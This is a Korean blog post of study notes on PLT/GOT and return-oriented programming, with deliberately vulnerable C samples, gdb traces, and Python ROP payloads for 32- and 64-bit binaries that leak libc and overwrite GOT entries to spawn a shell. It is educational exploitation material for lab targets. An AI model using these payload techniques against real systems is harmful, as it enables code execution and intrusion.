---
title: Return Oriented Programming (ROP)
date: 2022-08-12 14:14  +0900
categories: [Hacking, System]
tags: [Return Oriented Programming, ROP, PLT, GOT, 32 ROP, 64 ROP]
---

## PLT, GOT
<hr style="border-top: 1px solid;"><br>

PLT, GOT
: <a href="https://dreamhack.io/lecture/courses/3" target="_blank">Linux Exploitation & Mitigation Part 2</a>

<br>

PLT(Procedure Linkage Table)
: 외부 라이브러리 함수를 사용할 수 있도록 주소를 연결해주는 테이블

<br>

GOT(Global Offset Table)
: PLT에서 호출하는 resolve 함수로 구한 라이브러리 함수의 절대 주소가 저장되어 있는 테이블
: GOT에는 처음에 라이브러리 함수의 주소를 구하는 바이너리 코드 영역 주소가 저장되어 있다가, 함수가 처음 호출될 때 라이브러리 함수의 실제 주소가 저장.

<br>

ASLR이 적용되어 있는 환경에서, 동적으로 라이브러리를 링크하여 실행되는 ```바이너리(Dynamically linked binary)```는 바이너리가 실행될 때마다, 라이브러리가 매핑되는 메모리의 주소가 변한다. 

**PLT와 GOT 영역이 존재하는 이유**는 ```Dynamically linked binary```의 경우, **바이너리가 실행되기 전까지 라이브러리 함수의 주소를 알 수 없기 때문**이다. 

라이브러리가 메모리에 매핑된 후 라이브러리 함수가 호출되면, 정적 주소를 통해 해당 함수의 PLT와 GOT 영역에 접근함으로써 함수의 주소를 찾는다.

<br>

+ PUTS 함수의 PLT

```
   0x8048320 <puts@plt>:	jmp    DWORD PTR ds:0x804a00c
   0x8048326 <puts@plt+6>:	push   0x0
   0x804832b <puts@plt+11>:	jmp    0x8048310
```

<br>

+ PUTS 함수의 GOT

```
(gdb) x/wx 0x804a00c
0x804a00c:	0x08048326
(gdb) 
```

<br>

위의 코드들을 보면 ```0x8048320 <puts@plt>:	jmp    DWORD PTR ds:0x804a00c```에서 ```0x804a00c```메모리를 참조하여 저장되어 있는 값으로 jmp를 한다.

확인해보면 ```0x08048326```라는 값이 저장되어 있고 이 값으로 jmp를 하게 될텐데, 이 값은 ```0x8048326 <puts@plt+6>:	push   0x0```이다.

<br>

그래서 ```0x8048326 <puts@plt+6>:	push   0x0```로 jmp를 한 다음 ```push 0x0```을 하고 ```0x804832b <puts@plt+11>:	jmp    0x8048310```를 실행한다.

<br>

```
(gdb) x/2i 0x8048310
   0x8048310:	push   DWORD PTR ds:0x804a004
   0x8048316:	jmp    DWORD PTR ds:0x804a008
(gdb) x/wx 0x804a008
0x804a008:	0xf7fee000
```

<br>

확인해보니 ```0x804a008```에 저장된 값을 push 한 뒤, ```0x804a008``` 주소에 저장되어 있는 ```0xf7fee000```로 점프한다.

<br>

```
(gdb) x/11i 0xf7fee000
   0xf7fee000:	push   eax
   0xf7fee001:	push   ecx
   0xf7fee002:	push   edx
   0xf7fee003:	mov    edx,DWORD PTR [esp+0x10]
   0xf7fee007:	mov    eax,DWORD PTR [esp+0xc]
   0xf7fee00b:	call   0xf7fe77e0
   0xf7fee010:	pop    edx
   0xf7fee011:	mov    ecx,DWORD PTR [esp]
   0xf7fee014:	mov    DWORD PTR [esp],eax
   0xf7fee017:	mov    eax,DWORD PTR [esp+0x4]
   0xf7fee01b:	ret    0xc
(gdb) b*0xf7fee01b
Breakpoint 2 at 0xf7fee01b
(gdb) c
Continuing.
Breakpoint 2, 0xf7fee01b in ?? () from /lib/ld-linux.so.2
(gdb) x/wx $esp
0xffffd520:	0xf7e62ca0
(gdb) x/i 0xf7e62ca0
   0xf7e62ca0 <puts>:	push   %ebp
```

<br>

```0xf7fee000```가 ret하는 시점에 브레이크포인트를 건 다음, ret 후에 스택에 0xc가 push가 되므로, esp를 확인해보니 push된 값은 puts 함수였다.

즉, **```0xf7fee000```는 호출된 라이브러리 함수의 주소를 알아내는 함수**라는 것이다.

<br>

**함수의 GOT의 주소는 PLT 첫 부분의 jmp 하는 주소 값임을 확인할 수 있다.** 

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Abusing PLT, GOT
<hr style="border-top: 1px solid;"><br>

PLT에 존재하는 함수들(프로그램에서 한 번 이상 사용하는 라이브러리 함수들)은 **고정된 주소**를 통해 호출할 수 있다.

특정 함수의 PLT를 호출하면 함수의 실제 주소를 호출하는 것과 같은 효과를 보인다.

**PLT의 주소는 고정되어 있기 때문에, 서버에 ASLR 보호 기법이 적용되어 있어도 PLT로 점프하면 RTL과 비슷한 공격이 가능**하다.

<br>

PLT에는 프로그램 내에서 호출하는 함수들만 존재한다.

따라서 쉘을 흭득하기 위한 ```system``` 함수 등은 사용하지 않으면 ASLR 환경에서 직접 호출이 불가능하다.

<br>

```c
#include <stdio.h>
int main(void){
  char buf[32] = {};
  puts("Hello World!");
  puts("Hello ASLR!");
  scanf("%s", buf);
  return 0;
}
```

<br>

예를 들어, 위의 코드처럼 버퍼 오버플로우 취약점이 있다고 했을 때, 이를 이용해 exploit하여 puts로 ```ASLR!``` 문자열을 출력하는 것이 목표다.

```ASLR!``` 문자열은 코드 내에서 사용하므로 따로 메모리에 저장되어 있어서 가능하다.

<br>

그럼 버퍼와 SFP까지 채운 뒤,  리턴 주소를 ```0x8048326 <puts@plt+6>:	push   0x0```가 있는 주소인 ```0x8048326```으로 설정한다.

<br>

왜 ```puts@plt```로 설정하지 않고, ```puts@plt+6```으로 설정하는 이유는, 코드를 보면 scanf로 입력을 받는데 scanf는 공백, 개행 등 단어를 구분하는 문자를 만나면 입력을 더 받지 않기 때문에 20으로 시작하는 ```puts@plt```를 사용하지 않고 ```puts@plt+6```을 사용한 것이다.

어차피 동일하게 puts 함수를 호출하게 될 것이기 때문이다.

<br>

그럼 ```0x8048326```는 결국엔 puts 함수를 불러오게 되므로 즉, **함수**이므로 인자를 줄 수 있다.

따라서 페이로드는 ```BUF + SFP + \x26\x83\x04\x08 + "BBBB"(puts return 주소) + {ASLR! 문자열이 있는 주소}```가 된다.

<br>

또는 직접적으로 GOT의 주소를 바꿔주면 된다. 

```0x804a00c```에 저장된 값으로 jmp를 하기 때문에, gdb에서 ```set *0x804a00c=0xdeadbeef```로 변경해주면 ```0xdeadbeef```로 jmp하게 될 것이다.

<br>

그러나 위에서 말했듯이, 셸을 흭득하기 위한 system 함수 등은 프로그램에서 직접적으로 사용하지 않기 때문에 ASLR 환경에서 system 등의 함수들을 직접적으로 호출할 수 없다.

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Return Oriented Programming
<hr style="border-top: 1px solid;"><br>

PLT에는 프로그램 내에서 호출하는 함수들만 존재하므로, 프로그램에서 사용된 라이브러리 함수들에 대해서만 접근할 수 있다.

따라서 셸을 흭득하기 위한 함수들을 사용하지 않는 이상, 직접적인 호출이 불가능하다.

<br>

ROP는 코드 영역에 있는 다양한 코드 가젯들을 조합해 ```NX bit```와 ```ASLR 보호 기법```을 우회할 수 있는 공격 기법이다.

ROP 기술은 스택 오버플로우와 같은 취약점으로 콜 스택을 통제할 수 있기 때문에 주로 스택 기반 연산을 하는 코드 가젯들이 사용된다.

<br><br>
<hr style="border: 2px solid;">
<br><br>

## 32비트 ROP
<hr style="border-top: 1px solid;"><br>

```
0x8048380:
  pop eax
  ret
0x8048480:
  xchg ebp, ecx
  ret
  
0x8048580:
  mov ecx, eax
  ret
```

<br>

위와 같은 코드 가젯이 있을 때, 버퍼 오버플로 취약점으로 리턴 주소를 조작했다고 했을 때, 스택이 아래와 같이 되어 있다고 하자.

<br>

![image](https://user-images.githubusercontent.com/52172169/184302505-56db07c0-33fc-478b-8791-e4e4aef211dc.png)

<br>

그러면 리턴 주소를 ```0x8048380```로 설정했으므로 ```0x8048380```로 리턴하게 되고, esp는 ```0x41414141```를 가리킬 것이다.

```0x8048380```에 있는 코드를 실행하므로 ```pop eax```를 통해 eax에 ```0x41414141```가 들어가고, esp는 ```0x8048580```를 가리키게 된다.

```0x8048380```에서 마지막에 ret를 수행하므로 현재 esp인 ```0x8048580```로 가게 된다.

따라서 ecx에 eax 값인 ```0x41414141```이 담기게 된다.

<br>

ret 명령으로 코드 가젯을 이용하면 여러 가젯을 연결할 수 있다.

<br>

```c
// 드림핵 
#include <stdio.h>
int main(void){
  char buf[32] = {};
  puts("Hello World!");
  puts("Hello ASLR!");
  scanf("%s", buf);
  return 0;
}
```

<br>

위의 코드를 ROP를 이용해서 Exploit을 하여 ```system("/bin/sh")```를 실행하는 것이 목표다.

먼저 system 함수 주소와 ```/bin/sh``` 문자열의 주소를 찾아야 한다.

프로그램은 실행될 때마다 라이브러리 주소가 랜덤하게 매핑된다. 

그러나 한 번 매핑된 라이브러리 주소는 프로그램이 종료될 때까지 바뀌지 않는다.

이를 이용하여 system 함수와 ```/bin/sh``` 문자열의 주소를 찾을 수 있다.

<br>

먼저 메모리에 로딩된 ```libc.so.6``` 라이브러리의 주소를 구하는 방법을 알아본다.

puts 함수의 GOT를 구한 것처럼, scanf의 GOT을 구할 수 있는데 scanf는 ```%s``` 포맷 스트링을 인자로 사용하고 있기 때문에 주의해야 될 점이 있다.

**%s는 공백이나 개행 등 단어를 구분하는 문자를 입력하면 더 이상의 입력을 받지 않는다.** (위에서 설명한 것)

<br>

puts처럼 scanf의 GOT를 확인하면 ```0x8048340 <__isoc99_scanf@plt>:	jmp    DWORD PTR ds:0x804a014```이므로 ```0x804a014```가 된다.

여기에 담긴 값을 확인하기 위해 위에서 한 듯이 ```ASLR!``` 문자열의 주소 대신에 scanf GOT 주소를 넣어주면 된다.

하지만 아스키 범위를 넘어서는 값이 나오기 때문에 ```???```로 출력되어 알 수 없으므로 코드를 이용해서 언패킹하여 봐야 한다.

<br>

```
'Hello World!\r\n'
'Hello ASLR!\r\n'
'\xc0\xe0\xe2\xf7\r\n'
```

<br>

이런 식으로 나오는데, scanf의 GOT에 담긴 값은 ```0xf7e2e0c0```로 이 값이 scanf의 주소이다.

결론은 구한 ```scanf의 주소```와 ```libc 베이스 주소로부터 scanf 함수 주소까지의 오프셋```을 이용해 libc의 베이스 주소를 구할 수 있다.
: ```libc 베이스 주소 = scanf 주소 - libc 베이스 주소로부터 scanf 주소까지의 오프셋```

<br>

```readelf```를 이용해 libc.so.6 파일에서 scanf 함수의 오프셋을 구할 수 있습니다.

<br>

```
$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep scanf
   424: 0005c0c0   258 FUNC    GLOBAL DEFAULT   13 __isoc99_scanf@@GLIBC_2.7
```

<br>

```libc 베이스 주소 = scanf 주소 - 0x5c0c0```

<br>

이제 얻어낸 libc 주소를 통해 셸을 흭득할 수 있다.

ROP를 통해 scanf 함수를 호출해 ```scanf@got```에는 system 함수의 주소를 넣고, ```scanf@got+4```에는 ```/bin/sh``` 문자열을 입력한 후 ```scanf@plt```를 호출하여 최종적으로 ```system("/bin/sh")```를 실행하게 된다.

<br>

```objdump``` 명령어를 통해 코드 가젯에서 ```pop; pop; ret``` 코드를 찾는다.
: ```objdump -d ./example4 | grep -A3 pop```

<br>

```
 804851a:	5f                   	pop    %edi
 804851b:	5d                   	pop    %ebp
 804851c:	c3                   	ret  
```

<br>

이 코드 가젯을 이용해 esp 레지스터를 scanf 함수의 인자 2개 이후의 주소로 가리키게 설정한다.

<br>

![image](https://user-images.githubusercontent.com/52172169/184467955-5ec28748-5d49-476b-a38d-04db3b943eda.png)

<br>

코드만 따로 보면 아래와 같은데 자세한 설명은 드림핵 질문에서 as3617님의 설명을 보았다.
: <a href="https://dreamhack.io/forum/qna/1206" target="_blank">dreamhack.io/forum/qna/1206</a>

<br>

```python
pop_pop_ret = 0x804851a
pop_ret = pop_pop_ret + 1
scanf_plt = 0x8048340
puts_plt = 0x8048320
puts_got = 0x804a00c
string_fmt = 0x8048559      # "%s"
scanf_got = 0x804a014

payload  = "A"*36           # buf padding
payload += p32(puts_plt + 6)   # ret addr (puts@plt + 6)
payload += p32(pop_ret)  # ret after puts
payload += p32(scanf_got)   # scanf@got
payload += p32(scanf_plt)
payload += p32(pop_pop_ret)
payload += p32(string_fmt)
payload += p32(scanf_got)
payload += p32(scanf_plt)
payload += p32(0xdeadbeef)
payload += p32(scanf_got+4)
```

<br>

```python
payload  = "A"*36           # buf padding
payload += p32(puts_plt + 6)   # ret addr (puts@plt + 6)
payload += p32(pop_ret)  # ret after puts
payload += p32(scanf_got)   # scanf@got
payload += p32(scanf_plt)
payload += p32(pop_pop_ret)
payload += p32(string_fmt)
```

<br>

먼저 위의 코드로 보면, overflow가 발생했을 때의 main 함수에서 ret를 할 때의 스택 상황은 아래와 같다.

<br>

```
puts_plt + 6
pop_ret
scanf_got
scanf_plt
pop_pop_ret
%s
```

<br>

버퍼 오버플로우로 buf를 채우고 ret 주소에다 ```puts@plt+6```을 넣어줘서 puts 함수를 불러오는 것이다.

puts 함수의 리턴 주소로는 pop_ret가 되고 인자는 scanf_got가 된다. 

따라서 puts 함수는 scanf의 주소를 출력하게 되고 (위에서 본 주소, ```0xf7e2e0c0```), pop_ret의 주소로 리턴한다.

이 때의 스택은 아래와 같다.

<br>

```
scanf_got
scanf_plt
pop_pop_ret
%s
```

<br>

이 때, pop를 수행하여 ```scanf_got```가 스택에서 없어지고 ret를 수행하여 scanf_plt로 리턴하게 된다.

```scanf_plt```에서 scanf 함수의 인자로 ```%s``` 포맷 스트링을 주고 리턴 주소로 pop_pop_ret 주소를 넣어준다.

<br>

```
payload += p32(scanf_got)
payload += p32(scanf_plt)
payload += p32(0xdeadbeef)
payload += p32(scanf_got+4)
```

<br>

```
pop_pop_ret
%s
scanf_got
scanf_plt
0xdeadbeef
scanf_got+4
```

<br>

현재 스택을 보면 위에 처럼 되어 있다.

포맷 스트링의 주소값으로 scanf_got를 넣어주므로 scanf_got에 입력값이 들어가게 된다.

이 때, 드림핵에서 위의 코드를 보면 ```writeline(s, p32(system)+"/bin/sh\x00")``` 코드가 있다. 

즉, 입력값으로 system 함수의 주소와 문자열 ```/bin/sh```를 입력해준다.

따라서 ```scanf_got```에 system 함수의 주소와 문자열 ```/bin/sh```가 덮어지게 되었다.

<br>

입력이 끝난 뒤, ```pop_pop_ret```를 통해 ```%s, scanf_got```가 스택에서 없어지고, ret로 인해 ```scanf_plt```로 리턴된다.

근데 ```scanf_got```에는 system 함수의 주소가 덮어졌으므로 system 함수를 호출하게 되고 system 함수의 인자로는 ```/bin/sh```가 주어지게 된다.

따라서 셸을 흭득하게 되고, 끝나고 리턴은 ```0xdeadbeef```로 가게 될 것이다.

<br><br>
<hr style="border: 2px solid;">
<br><br>

## 64 비트 ROP
<hr style="border-top: 1px solid;"><br>

32비트 아키텍쳐에서는 함수 호출시 인자를 스택에 저장하는 반면, 64비트 아키텍쳐에서는 함수의 인자를 레지스터와 스택에 저장해 전달한다.

<br>

![image](https://user-images.githubusercontent.com/52172169/184472973-6bf921a7-1b04-4cc3-b664-b82249c81bf2.png)

<br>

따라서 ```rdi,rsi,rdx,rcx,r8,r9``` 레지스터를 전부 사용하면 다음 인자부터는 스택에 저장하게 된다.

64비트 아키텍쳐는 pop 명령어를 이용해 함수의 인자를 전달하는 방법으로 ROP를 할 수 있다.

<br>

```c
// 드림핵 코드
#include <stdio.h>
#include <unistd.h>
void gadget() {
	asm("pop %rdi");
	asm("pop %rsi");
	asm("pop %rdx");
	asm("ret");
}
int main()
{
	char buf[256];
	write(1, "Data: ", 6);
	read(0, buf, 1024); # 버퍼오버플로
	return 0;
}
```

<br>

위와 같은 코드가 있고, 편의를 위해 일부러 가젯을 넣어줬다고 한다.

먼저 ```pop rdi; pop rsi; pop rdx; ret``` 코드 가젯이 어디에 있는지, 주소를 찾아야 한다.
: ```objdump -d rop64 | grep "gadget" -A6```

<br>

```python
# write(1, 0x601018, 8)
payload  = "A"*264         # buf padding
payload += p64(0x40056a)   # pop rdi; pop rsi; pop rdx; ret
payload += p64(1)          # fd
payload += p64(0x601018)   # write@got
payload += p64(8)          # 8 
payload += p64(0x400430)   # write_plt 
```

<br>

찾은 코드 가젯을 이용해 write 함수를 호출한 뒤 ```write@got```에 저장되어 있는 값을 출력해서 라이브러리 주소를 알아낸다.

<br>

```python
# read(0, 0x601018, 16)
payload += p64(0x40056a)   # pop rdi; pop rsi; pop rdx; ret
payload += p64(0)          # fd
payload += p64(0x601018)   # write@got
payload += p64(16)          # 8
payload += p64(0x400440)   # read@plt

# write(0x601020,0,0)
payload += p64(0x40056a)   # pop rdi; pop rsi; pop rdx; ret
payload += p64(0x601020)   # /bin/sh
payload += p64(0)          # 0
payload += p64(0)          # 0
payload += p64(0x400430)   # write@plt

libc = u64(read(out_r,8)[:8])
base = libc - 0xf72b0
system = base + 0x45390
print hex(libc)

writeline(s, p64(system)+"/bin/sh\x00") # read가 호출될 때 입력해주는 것
```

<br>


이후, 알아낸 라이브러리 주소를 통해 read 함수를 호출하여 ```write@got```에 system 함수를 덮어쓰고 ```/bin/sh```(write@got+4) 문자열을 입력한다. 

최종적으로 write 함수를 호출하면 system 함수가 호출되고,  ```/bin/sh``` 문자열의 주소인 ```0x601020``` (write@got+4) 를 첫 번째 인자로 전달하면 최종적으로 ```system("/bin/sh")```가 되어 셸을 획득할 수 있다.

<br><br>
<hr style="border: 2px solid;">
<br><br>

## 출처 및 참고
<hr style="border-top: 1px solid;"><br>

내용 출처
: <a href="https://dreamhack.io/lecture/courses/3" target="_blank">Linux Exploitation & Mitigation Part 2</a>

<br>

참고하면 좋음
: <a href="https://bpsecblog.wordpress.com/about_got_plt/" target="_blank">bpsecblog.wordpress.com/about_got_plt/</a>
: <a href="https://opentutorials.org/module/4290/27194" target="_blank">opentutorials.org/module/4290/27194</a>
: <a href="https://www.lazenca.net/pages/viewpage.action?pageId=16810141" target="_blank">lazenca.net/pages/viewpage.action?pageId=16810141</a>

<br><br>
<hr style="border: 2px solid;">
<br><br>
